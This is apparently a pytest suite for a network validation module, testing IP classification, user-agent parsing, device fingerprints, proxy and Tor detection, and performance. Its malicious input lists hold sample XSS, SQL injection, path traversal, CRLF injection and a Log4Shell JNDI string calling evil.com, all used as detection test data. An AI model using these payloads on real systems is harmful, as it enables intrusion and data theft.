#!/usr/bin/env python3
"""
Comprehensive Test Suite for NetworkValidationRules

Tests all network validation scenarios including IP addresses, user agents,
device fingerprints, network security, and threat detection.

Performance Requirement: Network validation must complete in <50ms
Security Requirement: Must detect malicious network patterns
Coverage Target: >90% code coverage
"""

import pytest
import time
import ipaddress
from unittest.mock import patch, MagicMock
from typing import Any, Dict, List, Tuple

from app.utils.validation_rules.network_rules import NetworkValidationRules


class TestNetworkValidationRules:
    """Test the main NetworkValidationRules class"""

    @pytest.fixture
    def network_validator(self):
        """Create a fresh network validator instance for each test"""
        return NetworkValidationRules()

    def test_network_validator_initialization(self, network_validator):
        """Test network validator initializes with all required data"""
        # Check IP ranges are loaded
        assert hasattr(network_validator, 'PRIVATE_IP_RANGES')
        assert hasattr(network_validator, 'RESERVED_IP_RANGES')
        assert hasattr(network_validator, 'MALICIOUS_IP_PATTERNS')
        
        # Check user agent patterns are loaded
        assert hasattr(network_validator, 'USER_AGENT_PATTERNS')
        assert len(network_validator.USER_AGENT_PATTERNS) > 0
        
        # Check security patterns are loaded
        assert hasattr(network_validator, 'SUSPICIOUS_PATTERNS')
        assert 'bot_indicators' in network_validator.SUSPICIOUS_PATTERNS
        assert 'malicious_signatures' in network_validator.SUSPICIOUS_PATTERNS
        
        # Check geolocation data is available
        assert hasattr(network_validator, 'COUNTRY_IP_RANGES')
        assert hasattr(network_validator, 'ASN_RISK_SCORES')


class TestIPAddressValidation:
    """Test IP address validation functionality"""

    @pytest.fixture
    def network_validator(self):
        return NetworkValidationRules()

    @pytest.mark.parametrize("valid_ip", [
        "192.168.1.1",      # Private IPv4
        "10.0.0.1",         # Private IPv4
        "172.16.0.1",       # Private IPv4
        "8.8.8.8",          # Public IPv4
        "1.1.1.1",          # Public IPv4
        "127.0.0.1",        # Loopback IPv4
        "2001:db8::1",      # IPv6
        "::1",              # IPv6 loopback
        "fe80::1",          # IPv6 link-local
        "2001:4860:4860::8888",  # Google DNS IPv6
    ])
    def test_validate_ip_address_valid_formats(self, network_validator, valid_ip):
        """Test validation of valid IP address formats"""
        is_valid, error, analysis = network_validator.validate_ip_address(valid_ip)
        assert is_valid is True, f"IP address {valid_ip} should be valid"
        assert error is None
        assert isinstance(analysis, dict)
        assert 'ip_version' in analysis
        assert 'is_private' in analysis
        assert 'is_reserved' in analysis

    @pytest.mark.parametrize("invalid_ip", [
        "256.256.256.256",  # Invalid IPv4 octets
        "192.168.1",        # Incomplete IPv4
        "192.168.1.1.1",    # Too many octets
        "192.168.1.-1",     # Negative octet
        "not.an.ip.address", # Non-numeric
        "192.168.1.256",    # Octet too large
        "",                 # Empty string
        "   ",              # Whitespace only
        "192.168.1.01",     # Leading zeros
        ":::",              # Invalid IPv6
        "2001:db8::gggg",   # Invalid IPv6 hex
    ])
    def test_validate_ip_address_invalid_formats(self, network_validator, invalid_ip):
        """Test validation of invalid IP address formats"""
        is_valid, error, analysis = network_validator.validate_ip_address(invalid_ip)
        assert is_valid is False, f"IP address {invalid_ip} should be invalid"
        assert error is not None
        assert "Invalid IP address" in error

    def test_ip_address_type_detection(self, network_validator):
        """Test IP address type detection (IPv4/IPv6)"""
        ipv4_addresses = ["192.168.1.1", "8.8.8.8", "127.0.0.1"]
        ipv6_addresses = ["2001:db8::1", "::1", "fe80::1"]
        
        for ip in ipv4_addresses:
            is_valid, error, analysis = network_validator.validate_ip_address(ip)
            assert analysis['ip_version'] == 4, f"Should detect IPv4: {ip}"
        
        for ip in ipv6_addresses:
            is_valid, error, analysis = network_validator.validate_ip_address(ip)
            assert analysis['ip_version'] == 6, f"Should detect IPv6: {ip}"

    def test_private_ip_detection(self, network_validator):
        """Test detection of private IP addresses"""
        private_ips = [
            "192.168.1.1",      # RFC 1918
            "192.168.0.255",    # RFC 1918
            "10.0.0.1",         # RFC 1918
            "10.255.255.254",   # RFC 1918
            "172.16.0.1",       # RFC 1918
            "172.31.255.254",   # RFC 1918
            "127.0.0.1",        # Loopback
            "169.254.1.1",      # Link-local
        ]
        
        for ip in private_ips:
            is_valid, error, analysis = network_validator.validate_ip_address(ip)
            assert analysis['is_private'] is True, f"Should detect private IP: {ip}"

    def test_public_ip_detection(self, network_validator):
        """Test detection of public IP addresses"""
        public_ips = [
            "8.8.8.8",          # Google DNS
            "1.1.1.1",          # Cloudflare DNS
            "208.67.222.222",   # OpenDNS
            "4.4.4.4",          # Level3 DNS
            "74.125.224.72",    # Google
        ]
        
        for ip in public_ips:
            is_valid, error, analysis = network_validator.validate_ip_address(ip)
            assert analysis['is_private'] is False, f"Should detect public IP: {ip}"

    def test_reserved_ip_detection(self, network_validator):
        """Test detection of reserved IP addresses"""
        reserved_ips = [
            "0.0.0.0",          # This host
            "255.255.255.255",  # Limited broadcast
            "224.0.0.1",        # Multicast
            "240.0.0.1",        # Reserved for future use
            "127.0.0.1",        # Loopback
        ]
        
        for ip in reserved_ips:
            is_valid, error, analysis = network_validator.validate_ip_address(ip)
            assert analysis['is_reserved'] is True, f"Should detect reserved IP: {ip}"

    def test_geolocation_analysis(self, network_validator):
        """Test IP geolocation analysis"""
        # Test with known public IPs (mock the geolocation lookup)
        test_ips = ["8.8.8.8", "1.1.1.1", "208.67.222.222"]
        
        for ip in test_ips:
            is_valid, error, analysis = network_validator.validate_ip_address(ip)
            if 'geolocation' in analysis:
                geo = analysis['geolocation']
                assert isinstance(geo, dict)
                # Check expected geolocation fields
                expected_fields = ['country', 'region', 'city', 'asn']
                for field in expected_fields:
                    if field in geo:
                        assert isinstance(geo[field], (str, int))

    def test_asn_risk_assessment(self, network_validator):
        """Test ASN-based risk assessment"""
        # Test with various IP addresses that should have different ASN risk scores
        test_ips = ["8.8.8.8", "1.1.1.1", "192.168.1.1"]
        
        for ip in test_ips:
            is_valid, error, analysis = network_validator.validate_ip_address(ip)
            if 'asn_risk' in analysis:
                assert isinstance(analysis['asn_risk'], (int, float))
                assert 0 <= analysis['asn_risk'] <= 1


class TestUserAgentValidation:
    """Test user agent validation functionality"""

    @pytest.fixture
    def network_validator(self):
        return NetworkValidationRules()

    @pytest.mark.parametrize("valid_user_agent", [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0",
    ])
    def test_validate_user_agent_valid(self, network_validator, valid_user_agent):
        """Test validation of valid user agents"""
        is_valid, error, analysis = network_validator.validate_user_agent(valid_user_agent)
        assert is_valid is True, f"User agent should be valid: {valid_user_agent[:50]}..."
        assert error is None
        assert isinstance(analysis, dict)
        assert 'browser' in analysis
        assert 'operating_system' in analysis
        assert 'device_type' in analysis

    @pytest.mark.parametrize("suspicious_user_agent", [
        "",  # Empty user agent
        "   ",  # Whitespace only
        "curl/7.68.0",  # Command line tool
        "wget/1.20.3",  # Command line tool
        "python-requests/2.25.1",  # Bot/script
        "Scrapy/2.5.0",  # Web scraper
        "bot",  # Generic bot
        "spider",  # Web spider
        "crawler",  # Web crawler
        "scanner",  # Security scanner
        "a" * 1000,  # Extremely long user agent
        "<script>alert('xss')</script>",  # XSS attempt
        "'; DROP TABLE users; --",  # SQL injection attempt
    ])
    def test_validate_user_agent_suspicious(self, network_validator, suspicious_user_agent):
        """Test detection of suspicious user agents"""
        is_valid, error, analysis = network_validator.validate_user_agent(suspicious_user_agent)
        
        if not is_valid:
            assert error is not None
        
        # Check for suspicious indicators in analysis
        assert isinstance(analysis, dict)
        if 'is_suspicious' in analysis:
            # Some of these should be flagged as suspicious
            pass
        if 'bot_indicators' in analysis:
            assert isinstance(analysis['bot_indicators'], int)

    def test_user_agent_browser_detection(self, network_validator):
        """Test browser detection from user agents"""
        browser_tests = [
            ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36", "Chrome"),
            ("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0", "Firefox"),
            ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15", "Safari"),
            ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59", "Edge"),
        ]
        
        for user_agent, expected_browser in browser_tests:
            is_valid, error, analysis = network_validator.validate_user_agent(user_agent)
            if 'browser' in analysis:
                detected_browser = analysis['browser']
                assert expected_browser.lower() in detected_browser.lower(), f"Should detect {expected_browser} in {user_agent[:50]}..."

    def test_user_agent_os_detection(self, network_validator):
        """Test operating system detection from user agents"""
        os_tests = [
            ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Windows"),
            ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36", "macOS"),
            ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36", "Linux"),
            ("Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15", "iOS"),
            ("Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0", "Android"),
        ]
        
        for user_agent, expected_os in os_tests:
            is_valid, error, analysis = network_validator.validate_user_agent(user_agent)
            if 'operating_system' in analysis:
                detected_os = analysis['operating_system']
                assert expected_os.lower() in detected_os.lower(), f"Should detect {expected_os} in {user_agent[:50]}..."

    def test_user_agent_device_type_detection(self, network_validator):
        """Test device type detection from user agents"""
        device_tests = [
            ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "desktop"),
            ("Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15", "mobile"),
            ("Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15", "tablet"),
            ("Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0", "mobile"),
        ]
        
        for user_agent, expected_device in device_tests:
            is_valid, error, analysis = network_validator.validate_user_agent(user_agent)
            if 'device_type' in analysis:
                detected_device = analysis['device_type']
                assert expected_device in detected_device, f"Should detect {expected_device} in {user_agent[:50]}..."

    def test_bot_detection(self, network_validator):
        """Test bot detection in user agents"""
        bot_user_agents = [
            "Googlebot/2.1 (+http://www.google.com/bot.html)",
            "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
            "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
            "Twitterbot/1.0",
            "LinkedInBot/1.0 (compatible; Mozilla/5.0; Apache-HttpClient +http://www.linkedin.com)",
        ]
        
        for bot_ua in bot_user_agents:
            is_valid, error, analysis = network_validator.validate_user_agent(bot_ua)
            if 'is_bot' in analysis:
                assert analysis['is_bot'] is True, f"Should detect bot: {bot_ua}"
            if 'bot_type' in analysis:
                assert isinstance(analysis['bot_type'], str)


class TestDeviceFingerprintValidation:
    """Test device fingerprint validation functionality"""

    @pytest.fixture
    def network_validator(self):
        return NetworkValidationRules()

    def test_validate_device_fingerprint_valid(self, network_validator):
        """Test validation of valid device fingerprints"""
        valid_fingerprints = [
            "a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6",  # 32 char hex
            "1234567890abcdef1234567890abcdef12345678",  # 40 char hex
            "a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6",  # 64 char alphanumeric
            "device_fingerprint_12345",  # Alphanumeric with underscores
            "fp-12345-abcde-67890",  # With hyphens
        ]
        
        for fingerprint in valid_fingerprints:
            is_valid, error, analysis = network_validator.validate_device_fingerprint(fingerprint)
            assert is_valid is True, f"Device fingerprint should be valid: {fingerprint}"
            assert error is None
            assert isinstance(analysis, dict)

    def test_validate_device_fingerprint_invalid(self, network_validator):
        """Test validation of invalid device fingerprints"""
        invalid_fingerprints = [
            "",  # Empty
            "   ",  # Whitespace only
            "abc",  # Too short
            "a" * 200,  # Too long
            "invalid fingerprint with spaces",  # Spaces
            "fingerprint@with#special$chars%",  # Invalid special characters
            "<script>alert('xss')</script>",  # XSS attempt
            "'; DROP TABLE devices; --",  # SQL injection attempt
        ]
        
        for fingerprint in invalid_fingerprints:
            is_valid, error, analysis = network_validator.validate_device_fingerprint(fingerprint)
            assert is_valid is False, f"Device fingerprint should be invalid: {fingerprint}"
            assert error is not None

    def test_device_fingerprint_analysis(self, network_validator):
        """Test device fingerprint analysis"""
        test_fingerprint = "a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6"
        
        is_valid, error, analysis = network_validator.validate_device_fingerprint(test_fingerprint)
        
        assert is_valid is True
        assert isinstance(analysis, dict)
        
        # Check expected analysis fields
        expected_fields = ['length', 'format', 'entropy', 'uniqueness_score']
        for field in expected_fields:
            if field in analysis:
                assert isinstance(analysis[field], (int, float, str))

    def test_fingerprint_entropy_analysis(self, network_validator):
        """Test fingerprint entropy analysis"""
        # High entropy fingerprint (random)
        high_entropy_fp = "a7b9c2d8e1f6g3h4i5j0k7l9m2n8o1p6"
        
        # Low entropy fingerprint (repeated patterns)
        low_entropy_fp = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
        
        high_is_valid, high_error, high_analysis = network_validator.validate_device_fingerprint(high_entropy_fp)
        low_is_valid, low_error, low_analysis = network_validator.validate_device_fingerprint(low_entropy_fp)
        
        if 'entropy' in high_analysis and 'entropy' in low_analysis:
            assert high_analysis['entropy'] > low_analysis['entropy'], "High entropy fingerprint should have higher entropy score"


class TestNetworkSecurityValidation:
    """Test network security validation functionality"""

    @pytest.fixture
    def network_validator(self):
        return NetworkValidationRules()

    def test_detect_proxy_networks(self, network_validator):
        """Test detection of proxy/VPN networks"""
        # Test with known proxy/VPN IP ranges (mock data)
        proxy_ips = [
            "199.187.0.1",      # Known proxy range
            "108.61.0.1",       # VPN provider range
            "185.220.100.1",    # Tor exit node range
        ]
        
        for ip in proxy_ips:
            is_valid, error, analysis = network_validator.validate_ip_address(ip)
            if 'proxy_risk' in analysis:
                assert analysis['proxy_risk'] > 0.5, f"Should detect proxy risk for {ip}"

    def test_detect_tor_networks(self, network_validator):
        """Test detection of Tor exit nodes"""
        # Mock Tor exit node detection
        with patch.object(network_validator, '_is_tor_exit_node', return_value=True):
            is_valid, error, analysis = network_validator.validate_ip_address("185.220.100.1")
            if 'is_tor' in analysis:
                assert analysis['is_tor'] is True, "Should detect Tor exit node"

    def test_detect_datacenter_ips(self, network_validator):
        """Test detection of datacenter IP ranges"""
        # Test with known datacenter IP ranges
        datacenter_ips = [
            "54.243.0.1",       # AWS EC2
            "35.184.0.1",       # Google Cloud
            "40.74.0.1",        # Microsoft Azure
            "157.245.0.1",      # DigitalOcean
        ]
        
        for ip in datacenter_ips:
            is_valid, error, analysis = network_validator.validate_ip_address(ip)
            if 'is_datacenter' in analysis:
                assert analysis['is_datacenter'] is True, f"Should detect datacenter IP: {ip}"

    def test_detect_malicious_ips(self, network_validator):
        """Test detection of malicious IP addresses"""
        # Mock malicious IP detection
        malicious_ips = ["1.2.3.4", "5.6.7.8"]
        
        with patch.object(network_validator, '_check_malicious_ip_lists', return_value=True):
            for ip in malicious_ips:
                is_valid, error, analysis = network_validator.validate_ip_address(ip)
                if 'is_malicious' in analysis:
                    assert analysis['is_malicious'] is True, f"Should detect malicious IP: {ip}"

    def test_rate_limiting_detection(self, network_validator):
        """Test detection of rate limiting violations"""
        test_ip = "192.168.1.100"
        
        # Simulate high request rate
        rate_limit_data = {
            'ip_address': test_ip,
            'requests_per_minute': 1000,  # Very high rate
            'requests_per_hour': 50000,   # Very high rate
            'failed_requests': 500        # Many failures
        }
        
        is_suspicious, rate_msg, rate_analysis = network_validator.validate_request_patterns(rate_limit_data)
        
        if not is_suspicious:
            # High rates should trigger suspicion
            assert rate_analysis['rate_limit_violations'] > 0, "Should detect rate limit violations"

    def test_geographic_anomaly_detection(self, network_validator):
        """Test detection of geographic anomalies"""
        # Test with IP addresses from different geographic regions in short time
        geographic_data = {
            'current_ip': '8.8.8.8',      # US
            'previous_ips': [
                {'ip': '203.208.60.1', 'timestamp': '2024-01-01T10:00:00Z'},  # China
                {'ip': '77.88.8.8', 'timestamp': '2024-01-01T10:05:00Z'},     # Russia
            ],
            'time_window_minutes': 10
        }
        
        is_normal, geo_msg, geo_analysis = network_validator.validate_geographic_consistency(geographic_data)
        
        if 'geographic_anomalies' in geo_analysis:
            assert geo_analysis['geographic_anomalies'] > 0, "Should detect geographic anomalies"


class TestPerformanceRequirements:
    """Test performance requirements for network validation"""

    @pytest.fixture
    def network_validator(self):
        return NetworkValidationRules()

    def test_ip_validation_performance(self, network_validator):
        """Test IP validation meets performance requirements"""
        test_ips = [
            "192.168.1.1",
            "8.8.8.8",
            "2001:db8::1",
            "127.0.0.1",
            "10.0.0.1"
        ] * 20  # 100 validations total
        
        start_time = time.time()
        for ip in test_ips:
            network_validator.validate_ip_address(ip)
        end_time = time.time()
        
        execution_time_ms = (end_time - start_time) * 1000
        assert execution_time_ms < 50, f"IP validation took {execution_time_ms}ms, should be <50ms"

    def test_user_agent_validation_performance(self, network_validator):
        """Test user agent validation performance"""
        test_user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        
        start_time = time.time()
        for _ in range(100):
            network_validator.validate_user_agent(test_user_agent)
        end_time = time.time()
        
        execution_time_ms = (end_time - start_time) * 1000
        assert execution_time_ms < 50, f"User agent validation took {execution_time_ms}ms, should be <50ms"

    def test_device_fingerprint_performance(self, network_validator):
        """Test device fingerprint validation performance"""
        test_fingerprint = "a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6"
        
        start_time = time.time()
        for _ in range(100):
            network_validator.validate_device_fingerprint(test_fingerprint)
        end_time = time.time()
        
        execution_time_ms = (end_time - start_time) * 1000
        assert execution_time_ms < 50, f"Device fingerprint validation took {execution_time_ms}ms, should be <50ms"

    def test_batch_validation_performance(self, network_validator):
        """Test batch validation performance"""
        network_data = {
            'ip_address': '192.168.1.1',
            'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'device_fingerprint': 'a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6'
        }
        
        start_time = time.time()
        for _ in range(25):
            network_validator.validate_ip_address(network_data['ip_address'])
            network_validator.validate_user_agent(network_data['user_agent'])
            network_validator.validate_device_fingerprint(network_data['device_fingerprint'])
        end_time = time.time()
        
        execution_time_ms = (end_time - start_time) * 1000
        assert execution_time_ms < 50, f"Batch network validation took {execution_time_ms}ms, should be <50ms"


class TestEdgeCasesAndErrorHandling:
    """Test edge cases and error handling for network validation"""

    @pytest.fixture
    def network_validator(self):
        return NetworkValidationRules()

    def test_empty_input_handling(self, network_validator):
        """Test handling of empty inputs"""
        empty_inputs = [None, "", "   ", "\t", "\n"]
        
        for empty_input in empty_inputs:
            # IP validation
            is_valid, error, analysis = network_validator.validate_ip_address(empty_input or "")
            assert is_valid is False
            assert isinstance(analysis, dict)
            
            # User agent validation
            is_valid, error, analysis = network_validator.validate_user_agent(empty_input or "")
            assert isinstance(analysis, dict)
            
            # Device fingerprint validation
            is_valid, error, analysis = network_validator.validate_device_fingerprint(empty_input or "")
            assert is_valid is False
            assert isinstance(analysis, dict)

    def test_very_long_input_handling(self, network_validator):
        """Test handling of very long inputs"""
        very_long_input = "a" * 10000  # 10KB of data
        
        # Should handle gracefully without crashing
        start_time = time.time()
        
        is_valid, error, analysis = network_validator.validate_user_agent(very_long_input)
        assert isinstance(is_valid, bool)
        assert isinstance(analysis, dict)
        
        is_valid, error, analysis = network_validator.validate_device_fingerprint(very_long_input)
        assert isinstance(is_valid, bool)
        assert isinstance(analysis, dict)
        
        end_time = time.time()
        execution_time_ms = (end_time - start_time) * 1000
        assert execution_time_ms < 100, "Should handle large inputs efficiently"

    def test_unicode_input_handling(self, network_validator):
        """Test handling of Unicode inputs"""
        unicode_inputs = [
            "用户代理",  # Chinese characters
            "🙂😀💯",    # Emoji
            "тест",      # Cyrillic
            "test\x00\x01\x02",  # Control characters
            "test\r\n\t",  # Mixed whitespace
        ]
        
        for unicode_input in unicode_inputs:
            # Should handle gracefully without crashing
            try:
                is_valid, error, analysis = network_validator.validate_user_agent(unicode_input)
                assert isinstance(is_valid, bool)
                assert isinstance(analysis, dict)
                
                is_valid, error, analysis = network_validator.validate_device_fingerprint(unicode_input)
                assert isinstance(is_valid, bool)
                assert isinstance(analysis, dict)
            except Exception as e:
                pytest.fail(f"Should handle Unicode gracefully: {unicode_input}, error: {e}")

    def test_malicious_input_handling(self, network_validator):
        """Test handling of potentially malicious inputs"""
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com}",
            "%0a%0dSet-Cookie:admin=true",
        ]
        
        for malicious_input in malicious_inputs:
            # Should detect and handle malicious content
            is_valid, error, analysis = network_validator.validate_user_agent(malicious_input)
            # Either reject it or flag it as suspicious
            if is_valid:
                assert analysis.get('is_suspicious', False) is True, f"Should flag as suspicious: {malicious_input}"
            
            is_valid, error, analysis = network_validator.validate_device_fingerprint(malicious_input)
            assert is_valid is False, f"Should reject malicious fingerprint: {malicious_input}"

    def test_network_timeout_handling(self, network_validator):
        """Test handling of network timeouts during validation"""
        # Mock network timeout scenarios
        with patch('socket.gethostbyaddr', side_effect=Exception("Network timeout")):
            # Should handle network failures gracefully
            is_valid, error, analysis = network_validator.validate_ip_address("8.8.8.8")
            assert isinstance(is_valid, bool)
            assert isinstance(analysis, dict)
            # Network failure shouldn't crash the validation


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--cov=app.utils.validation_rules.network_rules"])